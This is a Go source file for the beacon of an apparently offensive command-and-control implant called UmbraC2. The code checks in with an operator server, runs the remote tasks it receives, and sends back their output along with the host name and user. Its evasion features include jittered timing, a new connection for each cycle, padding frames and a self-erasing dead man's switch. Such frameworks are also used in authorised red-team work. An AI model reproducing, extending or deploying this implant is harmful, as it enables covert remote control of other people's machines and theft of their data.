package beacon

import (
	"context"
	"encoding/hex"
	"errors"
	"fmt"
	"math/rand"
	"net"
	"os"
	"time"

	"github.com/thesyntax1/UmbraC2/implant/go/internal/crypt"
	"github.com/thesyntax1/UmbraC2/implant/go/internal/session"
	"github.com/thesyntax1/UmbraC2/implant/go/internal/wire"
)

// Version is the version of this implant.
const Version = "0.1.0"

// The limits of one cycle.
//
// A batch that carries more tasks than this is cut short: the rest of
// the tasks stay in the queue of the server and come with the next
// batch.  A server that sends control frames without a batch is given up
// on, so a hostile peer cannot keep the implant busy forever.
const (
	maxTasksPerCycle = 32
	maxControlFrames = 8
)

// Config is the configuration of the beacon.
type Config struct {
	// Server is the address of the server, "host:port".
	Server string
	// PSK is the pre-shared key of the agent.
	PSK []byte
	// ID is the name this implant registers under.
	ID string
	// Suite is the AEAD suite of the session.
	Suite byte
	// Sleep is the base interval between two check-ins.
	Sleep time.Duration
	// JitterPct is the width of the window the interval is drawn from,
	// in percent of the base interval.
	JitterPct int
	// Timeout is the deadline of the connection and of the tasks.
	Timeout time.Duration
	// Log receives the lines of the implant.  It never gets anything
	// that the implant would not put on the wire anyway.
	Log func(format string, args ...any)
}

// Beacon is the implant: it checks in with the server, runs the tasks it
// is given and reports what they produced.
type Beacon struct {
	cfg      Config
	started  time.Time
	cycles   uint64
	failures uint64
	stop     bool
}

// New builds a beacon and fills in the defaults.
func New(cfg Config) (*Beacon, error) {
	if cfg.Server == "" {
		return nil, errors.New("the beacon needs the address of the server")
	}
	if len(cfg.PSK) == 0 {
		return nil, errors.New("the beacon needs a pre-shared key")
	}
	if cfg.Suite == 0 {
		cfg.Suite = wire.SuiteAES256GCM
	}
	if !crypt.SuiteSupported(cfg.Suite) {
		return nil, fmt.Errorf("the suite %d is not one this implant speaks", cfg.Suite)
	}
	if cfg.Sleep <= 0 {
		cfg.Sleep = 30 * time.Second
	}
	if cfg.JitterPct < 0 {
		cfg.JitterPct = 0
	}
	if cfg.JitterPct > 90 {
		cfg.JitterPct = 90
	}
	if cfg.Timeout <= 0 {
		cfg.Timeout = 30 * time.Second
	}
	if cfg.Log == nil {
		cfg.Log = func(string, ...any) {}
	}
	if cfg.ID == "" {
		id, err := defaultID()
		if err != nil {
			return nil, err
		}
		cfg.ID = id
	}
	return &Beacon{cfg: cfg, started: time.Now()}, nil
}

// defaultID builds the name of an implant that was not given one: the
// name of the host and a few random bytes, so two implants on the same
// host do not collide.
func defaultID() (string, error) {
	host, err := os.Hostname()
	if err != nil || host == "" {
		host = "host"
	}
	rnd, err := crypt.RandomBytes(3)
	if err != nil {
		return "", fmt.Errorf("random suffix: %w", err)
	}
	return "go-" + host + "-" + hex.EncodeToString(rnd), nil
}

// Run keeps the implant alive until the context is cancelled or the
// operator tells it to stop.
func (b *Beacon) Run(ctx context.Context) error {
	for {
		if err := ctx.Err(); err != nil {
			return err
		}
		if b.stop {
			return nil
		}
		// The dead man's switch: the operator stopped checking in, so the
		// implant takes its traces with it and leaves.  An implant that
		// outlives its engagement is an implant nobody watches.
		if forensicDeadmanFired() {
			b.logf("the dead man's switch fired: the operator went quiet")
			b.taskDecommission(map[string]any{})
			return nil
		}
		keep, err := b.cycle(ctx)
		if b.stop {
			return nil
		}
		if err != nil {
			b.failures++
			b.logf("cycle failed (%v), backing off", err)
			if err := b.wait(ctx, b.backoff()); err != nil {
				return err
			}
			continue
		}
		b.failures = 0
		b.cycles++
		if !keep {
			return nil
		}
		if err := b.wait(ctx, b.nextInterval()); err != nil {
			return err
		}
	}
}

// Stop asks the beacon to end after the current cycle.
func (b *Beacon) Stop() {
	b.stop = true
}

// cycle is one round trip: connect, shake hands, check in, run the
// tasks and go back to sleep.
//
// The connection is opened and closed for every cycle: a beacon that
// holds a link open forever is easy to see, and a fresh link hides the
// pattern of the operator's traffic.
func (b *Beacon) cycle(ctx context.Context) (bool, error) {
	conn, err := b.dial(ctx)
	if err != nil {
		return false, err
	}
	defer conn.Close()

	hs, err := ClientHandshake(conn, b.cfg.PSK, b.cfg.ID, b.cfg.Suite, b.helloMeta(), b.hello())
	if err != nil {
		return false, fmt.Errorf("handshake: %w", err)
	}
	sess := hs.Session
	b.logf("registered as %s", b.cfg.ID)
	// The journal of the engagement is a trace of its own, so it is
	// written only while the operator asks for it.
	if forensicJournalEnabled() {
		forensicJournalAppend("handshake", "the session with the server is open")
	}
	// Every check-in of the operator is a proof that the engagement is
	// alive, so the dead man's switch renews its window.
	forensicDeadmanRenew()

	// The check-in: the server answers with the batch of the work.
	checkin := map[string]any{
		"ts": uint64(time.Now().Unix()),
		"n":  uint64(0),
	}
	frame, err := sess.Encrypt(wire.MsgCheckin, checkin)
	if err != nil {
		return false, fmt.Errorf("seal check-in: %w", err)
	}
	if err := writeFrame(conn, frame); err != nil {
		return false, fmt.Errorf("write check-in: %w", err)
	}

	batch, cancelled, err := b.readBatch(conn, sess)
	if err != nil {
		return false, err
	}

	tasks := arrField(batch, "tasks")
	// The heartbeat says what the implant is and how much work it is
	// carrying.  It is sent after the batch, because a frame between
	// the check-in and the batch would be sealed with the old keys when
	// the server has already switched.
	if err := b.sendHeartbeat(conn, sess, len(tasks)); err != nil {
		return false, err
	}

	// The server decides the cadence and the jitter of the implant.
	b.applyPolicy(batch)

	for i, item := range tasks {
		if i >= maxTasksPerCycle {
			b.logf("the batch carried %d tasks, %d of them run in this cycle", len(tasks), maxTasksPerCycle)
			break
		}
		task, ok := item.(map[string]any)
		if !ok {
			continue
		}
		id := strField(task, "id")
		kind := strField(task, "kind")
		args := mapField(task, "args")
		if id == "" {
			continue
		}
		if cancelled[id] {
			// The task is still reported: the server keeps the
			// cancelled state and stores the output, so the operator
			// sees that nothing ran.
			b.logf("task %s skipped (cancelled)", id)
			b.sendResult(conn, sess, id, &Outcome{Code: 125, Err: "cancelled before execution"})
			continue
		}
		b.logf("task %s kind=%s", id, kind)
		if forensicJournalEnabled() {
			forensicJournalAppend("task", kind)
		}
		outcome := b.runTask(kind, args)
		if err := b.sendResult(conn, sess, id, &outcome); err != nil {
			return false, err
		}
		if b.stop {
			break
		}
	}

	// The goodbye is polite: the server closes its side of the link
	// when it sees it.
	if frame, err := sess.Encrypt(wire.MsgBye, map[string]any{}); err == nil {
		_ = writeFrame(conn, frame)
	}
	return !b.stop, nil
}

// readBatch reads the frames between the check-in and the batch.
//
// The server may rotate the keys right before the batch, and it may
// cancel a task on the way, so the frames are read until the batch
// arrives instead of guessing how many there are.
func (b *Beacon) readBatch(conn net.Conn, sess *session.Session) (map[string]any, map[string]bool, error) {
	cancelled := map[string]bool{}
	for i := 0; i < maxControlFrames; i++ {
		raw, err := wire.ReadFrame(conn)
		if err != nil {
			return nil, nil, fmt.Errorf("read batch: %w", err)
		}
		msgType, body, err := sess.OpenMessage(raw)
		if err != nil {
			return nil, nil, fmt.Errorf("open batch frame: %w", err)
		}
		switch msgType {
		case wire.MsgRekey:
			// The rekey frame is sealed with the old keys and it is
			// followed by the batch, which is sealed with the new ones.
			seed := binField(body, "seed")
			if len(seed) != 32 {
				return nil, nil, errors.New("malformed REKEY seed")
			}
			if err := sess.ApplyRekey(seed); err != nil {
				return nil, nil, fmt.Errorf("rekey: %w", err)
			}
			b.logf("session rekeyed")
		case wire.MsgTaskCancel:
			id := strField(body, "id")
			if id == "" {
				return nil, nil, errors.New("TASK_CANCEL without a task id")
			}
			b.logf("task %s cancelled by operator", id)
			cancelled[id] = true
		case wire.MsgTaskBatch:
			return body, cancelled, nil
		case wire.MsgKill:
			b.logf("the server sent KILL")
			b.stop = true
			return map[string]any{}, cancelled, nil
		case wire.MsgPadding:
			// Padding frames carry random bytes: they only make the
			// traffic shape uniform.
		default:
			return nil, nil, fmt.Errorf("expected TASK_BATCH, got %s", wire.TypeName(msgType))
		}
	}
	return nil, nil, errors.New("too many control frames before TASK_BATCH")
}

// sendHeartbeat reports the state of the implant to the server.
func (b *Beacon) sendHeartbeat(conn net.Conn, sess *session.Session, busy int) error {
	body := map[string]any{
		"v":    uint64(1),
		"iver": Version,
		"abi":  uint64(wire.ABIVersion),
		"busy": uint64(busy),
		"up":   uint64(time.Since(b.started).Seconds()),
	}
	frame, err := sess.Encrypt(wire.MsgHeartbeat, body)
	if err != nil {
		return fmt.Errorf("seal heartbeat: %w", err)
	}
	if err := writeFrame(conn, frame); err != nil {
		return fmt.Errorf("write heartbeat: %w", err)
	}
	return nil
}

// sendResult reports the outcome of a task and wipes the output behind
// it: the server has it, and the implant does not need it in memory.
func (b *Beacon) sendResult(conn net.Conn, sess *session.Session, id string, outcome *Outcome) error {
	// A streamed answer travels in pieces: every chunk is a partial
	// result, so the task stays open while the chunks travel, and the
	// final result below closes it.
	for _, chunk := range outcome.Chunks {
		partial := map[string]any{
			"id":      id,
			"code":    int64(outcome.Code),
			"out":     chunk,
			"err":     "",
			"partial": true,
		}
		frame, err := sess.Encrypt(wire.MsgResult, partial)
		if err != nil {
			return fmt.Errorf("seal partial result: %w", err)
		}
		if err := writeFrame(conn, frame); err != nil {
			return fmt.Errorf("write partial result: %w", err)
		}
	}
	body := map[string]any{
		"id":   id,
		"code": int64(outcome.Code),
		"out":  outcome.Out,
		"err":  outcome.Err,
	}
	for k, v := range outcome.Extra {
		body[k] = v
	}
	frame, err := sess.Encrypt(wire.MsgResult, body)
	if err != nil {
		return fmt.Errorf("seal result: %w", err)
	}
	if err := writeFrame(conn, frame); err != nil {
		return fmt.Errorf("write result: %w", err)
	}
	outcome.Out = nil
	outcome.Chunks = nil
	return nil
}

// applyPolicy takes the cadence of the server over the compiled-in one.
func (b *Beacon) applyPolicy(batch map[string]any) {
	if sleep, ok := u64Field(batch, "sleep"); ok && sleep > 0 {
		b.cfg.Sleep = time.Duration(sleep) * time.Second
	}
	if jitter, ok := u64Field(batch, "jitter"); ok {
		b.cfg.JitterPct = clampInt(int(jitter), 0, 90)
	}
}

// hello is the greeting of the implant.
func (b *Beacon) hello() Hello {
	return Hello{
		Version:        wire.HelloVersion,
		Capabilities:   Capabilities(),
		ImplantVersion: Version,
		ABI:            wire.ABIVersion,
		Platform:       b.platform(),
	}
}

// helloMeta is the metadata of the implant: the server shows it in the
// inventory, next to the host.
func (b *Beacon) helloMeta() map[string]any {
	meta := map[string]any{
		"os":   osName(),
		"arch": archName(),
		"lang": "go",
	}
	if host, err := os.Hostname(); err == nil {
		meta["host"] = host
	}
	if user := currentUser(); user != "" {
		meta["user"] = user
	}
	return meta
}

// platform describes the host the implant runs on.
func (b *Beacon) platform() map[string]any {
	plat := map[string]any{
		"os":   osName(),
		"arch": archName(),
		"lang": "go",
	}
	if host, err := os.Hostname(); err == nil && host != "" {
		plat["host"] = host
	}
	if user := currentUser(); user != "" {
		plat["user"] = user
	}
	return plat
}

// dial opens the connection to the server.
func (b *Beacon) dial(ctx context.Context) (net.Conn, error) {
	dialer := &net.Dialer{Timeout: b.cfg.Timeout}
	conn, err := dialer.DialContext(ctx, "tcp", b.cfg.Server)
	if err != nil {
		return nil, fmt.Errorf("connect to %s: %w", b.cfg.Server, err)
	}
	if b.cfg.Timeout > 0 {
		_ = conn.SetDeadline(time.Now().Add(b.cfg.Timeout))
	}
	return conn, nil
}

// backoff is the wait after a failed cycle: every failure doubles the
// wait, up to five minutes.
func (b *Beacon) backoff() time.Duration {
	base := b.cfg.Sleep
	if base <= 0 {
		base = 30 * time.Second
	}
	factor := time.Duration(1) << uint(minInt(int(b.failures), 5))
	d := base * factor
	if d > 5*time.Minute {
		d = 5 * time.Minute
	}
	return d
}

// nextInterval draws the interval of the next cycle.
//
// The window is drawn around the base interval: the gaps arrive in
// clusters instead of spreading evenly over the whole range, and the
// value inside the window is stable for the whole cycle.
func (b *Beacon) nextInterval() time.Duration {
	base := b.cfg.Sleep
	if base <= 0 {
		base = 30 * time.Second
	}
	if b.cfg.JitterPct <= 0 {
		return base
	}
	window := time.Duration(float64(base) * float64(b.cfg.JitterPct) / 100)
	if window <= 0 {
		return base
	}
	delta := time.Duration(rand.Int63n(int64(2*window)+1)) - window
	d := base + delta
	if d < time.Second {
		d = time.Second
	}
	return d
}

// wait sleeps for d, but it wakes up when the context is cancelled.
func (b *Beacon) wait(ctx context.Context, d time.Duration) error {
	if d <= 0 {
		return ctx.Err()
	}
	timer := time.NewTimer(d)
	defer timer.Stop()
	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-timer.C:
		return nil
	}
}

// logf writes a line of the implant.
func (b *Beacon) logf(format string, args ...any) {
	b.cfg.Log(format, args...)
}

// writeFrame writes a whole frame to the connection.
func writeFrame(conn net.Conn, frame []byte) error {
	_, err := conn.Write(frame)
	return err
}

// clampInt keeps a number inside a range.
func clampInt(v, low, high int) int {
	if v < low {
		return low
	}
	if v > high {
		return high
	}
	return v
}

// minInt is the smaller of two numbers.
func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}
